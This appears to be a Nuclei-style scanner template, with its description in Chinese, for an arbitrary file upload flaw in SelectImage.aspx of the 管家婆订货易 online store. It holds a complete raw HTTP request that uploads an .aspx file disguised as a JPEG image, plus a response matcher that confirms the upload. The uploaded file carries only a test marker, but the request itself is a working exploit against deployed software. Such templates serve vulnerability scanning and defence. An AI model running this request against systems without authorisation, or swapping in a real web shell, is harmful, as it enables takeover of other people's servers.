id: yizaixian-SelectImage-upload
info:
  name: yizaixian-SelectImage-upload
  author: apple
  severity: high
  description: 管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BB%BB%E6%88%91%E8%A1%8C%20%E7%AE%A1%E5%AE%B6%E5%A9%86%20%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E%20SelectImage.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
        Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b
        Content-Length: 202

        --532c7611457d40f4ae4cd9422973416b
        Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
        Content-Type: image/jpeg

        <% Response.Write("Test"); %>
        --532c7611457d40f4ae4cd9422973416b--
    matchers:
      - type: word
        part: body
        words:
          - '/templates/'
